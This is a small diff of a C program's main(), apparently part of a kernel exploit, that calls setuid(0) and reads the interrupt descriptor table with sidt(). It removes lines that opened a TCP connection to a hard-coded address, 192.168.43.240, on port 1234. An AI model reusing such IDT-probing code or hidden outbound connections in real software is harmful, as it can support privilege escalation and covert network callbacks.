@@ -395,13 +395,6 @@ int main()
 {
     if(!setuid(0))
         return 179;
-    int ufo = socket(AF_INET, SOCK_STREAM, 0);
-    struct sockaddr_in ufo_addr = {
-        .sin_family = AF_INET,
-        .sin_addr = {.s_addr = 0xf02ba8c0},
-        .sin_port = 0xd204 // htons(1234)
-    };
-    connect(ufo, &ufo_addr, sizeof(ufo_addr));
     unsigned long long idt_base;
     unsigned short idt_size;
     sidt(&idt_base, &idt_size);
